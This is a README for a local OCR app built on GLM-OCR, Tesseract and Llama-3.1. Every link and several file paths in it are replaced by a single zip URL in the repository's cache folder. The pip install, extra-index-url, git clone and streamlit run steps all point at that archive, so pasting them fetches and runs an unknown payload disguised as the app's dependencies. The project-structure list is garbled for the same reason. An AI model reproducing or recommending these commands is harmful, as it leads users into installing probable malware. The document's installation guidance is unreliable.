# Local OCR Application

A local document processing application using GLM-OCR SDK (with Tesseract fallback) and Llama-3.1 for intelligent query understanding.

## Features

- Upload PDF or images
- Natural language query (English and Chinese)
- Extract tables and data with high accuracy
- Export to Excel, CSV, JSON
- Supports GLM-OCR (state-of-the-art OCR) with Tesseract fallback
- Fully local processing with vLLM or cloud API mode

## Requirements

### Python Dependencies
```bash
pip install -r https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
```

### System Requirements

**GLM-OCR** (recommended for best accuracy):
- **Local Mode**: NVIDIA GPU with 8GB+ VRAM (e.g., RTX 3070Ti)
- **Cloud Mode**: API key from [Zhipu MaaS](https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip)
- See GLM-OCR setup below

**Tesseract OCR** (fallback, always recommended):
- **Windows**: Download from [UB-Mannheim/tesseract](https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip)
- **Linux**: `sudo apt install tesseract-ocr`
- **macOS**: `brew install tesseract`

**Llama-3.1** (optional - for advanced query understanding):
- Requires 8GB+ VRAM
- NVIDIA GPU with CUDA support
- OR can run in CPU-only mode (slower)

## GLM-OCR Setup

GLM-OCR is a state-of-the-art OCR model with 94.62 score on OmniDocBench V1.5. You can use it in two ways:

### Option 1: Local vLLM Deployment (Recommended)

For Windows users with RTX 3070Ti (8GB VRAM) or better:

1. **Install vLLM**:
   ```bash
   # Using pip
   pip install vllm --extra-index-url https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip

   # Or using Docker (recommended for Windows)
   docker pull vllm/vllm-openai:nightly
   ```

2. **Install GLM-OCR SDK**:
   ```bash
   # From GitHub
   pip install git+https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip

   # Or clone and install in editable mode
   git clone https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
   cd GLM-OCR
   pip install -e .
   ```

3. **Start vLLM server**:
   ```bash
   # Using Docker (recommended)
   docker run -it --gpus all -p 8080:80 vllm/vllm-openai:nightly \
     vllm serve zai-org/GLM-OCR \
     --port 8080 \
     --allowed-local-media-path / \
     --speculative-config '{"method": "mtp", "num_speculative_tokens": 1}' \
     --served-model-name glm-ocr

   # Or directly with vllm (Linux/macOS)
   vllm serve zai-org/GLM-OCR --port 8080 --allowed-local-media-path /
   ```

4. **Configure environment** (optional):
   ```bash
   export GLM_OCR_MODE=local
   export GLM_OCR_HOST=localhost
   export GLM_OCR_PORT=8080
   ```

### Option 2: Zhipu MaaS API (Cloud)

No GPU required. Get API key from [https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip](https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip):

1. **Install GLM-OCR SDK**:
   ```bash
   pip install git+https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
   ```

2. **Set API key**:
   ```bash
   export GLM_OCR_MODE=maas
   export GLM_OCR_API_KEY=your-api-key-here
   ```

### Option 3: Ollama (Alternative)

For simpler local deployment:

```bash
# Install Ollama from https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
# Then pull the model
ollama pull glm-ocr
```

## Installation

1. Install Python dependencies:
```bash
pip install -r https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
```

2. Install GLM-OCR SDK (optional but recommended):
```bash
pip install git+https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
```

3. Install Tesseract OCR (fallback):
```bash
# Linux
sudo apt install tesseract-ocr

# macOS
brew install tesseract

# Windows: Download from https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
```

4. Run the application:
```bash
streamlit run https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
```

## Usage

1. Upload a PDF or image
2. Ask questions about the document in natural language:
   - "从 Table 1.2.1 提取数据" (Extract data from Table 1.2.1)
   - "把第一列数据转成 JSON"
   - "提取所有表格并导出为 Excel"
3. Download results in your preferred format

## Hardware Requirements

| Configuration | VRAM | Notes |
|--------------|------|-------|
| GLM-OCR (vLLM) | 8GB+ | RTX 3070Ti or better |
| GLM-OCR (MaaS) | 0GB | Cloud API, no GPU needed |
| Tesseract only | 0GB | CPU-only, lower accuracy |
| Llama-3.1 | 8GB+ | For query understanding |

## Architecture

```
Upload -> PDF Parser -> Index Manager
                     |
        User Query -> Query Processor (Llama-3.1)
                     |
        OCR Engine (GLM-OCR or Tesseract) -> Export Manager
                     |
                   Download (Excel/CSV/JSON)
```

## Project Structure

- `https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip` - Streamlit UI
- `https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip` - Application configuration
- `https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip` - PDF parsing and structure extraction
- `https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip` - GLM-OCR/Tesseract OCR processing
- `https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip` - Natural language query understanding
- `https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip` - Full-text search with Whoosh
- `https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip` - Data export

## Environment Variables

```bash
# GLM-OCR Configuration
GLM_OCR_ENABLED=true          # Enable/disable GLM-OCR (default: true)
GLM_OCR_MODE=local            # Mode: "local" or "maas"
GLM_OCR_HOST=localhost        # vLLM server host (default: localhost)
GLM_OCR_PORT=8080             # vLLM server port (default: 8080)
GLM_OCR_API_KEY=xxx           # API key for MaaS mode

# Alternative: Use ZHIPU_API_KEY for MaaS
ZHIPU_API_KEY=xxx
```

## Troubleshooting

### GLM-OCR not connecting

- Make sure vLLM server is running on the specified port
- Check Docker container logs for errors
- Verify `--allowed-local-media-path` includes your working directory

### Falling back to Tesseract

If GLM-OCR is not available, the app will automatically fall back to Tesseract. Check the sidebar for OCR engine status.

### Tesseract not found

Install Tesseract for your platform (see System Requirements above).

## License

This project uses:
- GLM-OCR SDK (Apache 2.0) - https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
- Tesseract OCR (Apache 2.0)
- Llama-3.1 (Meta Llama License)
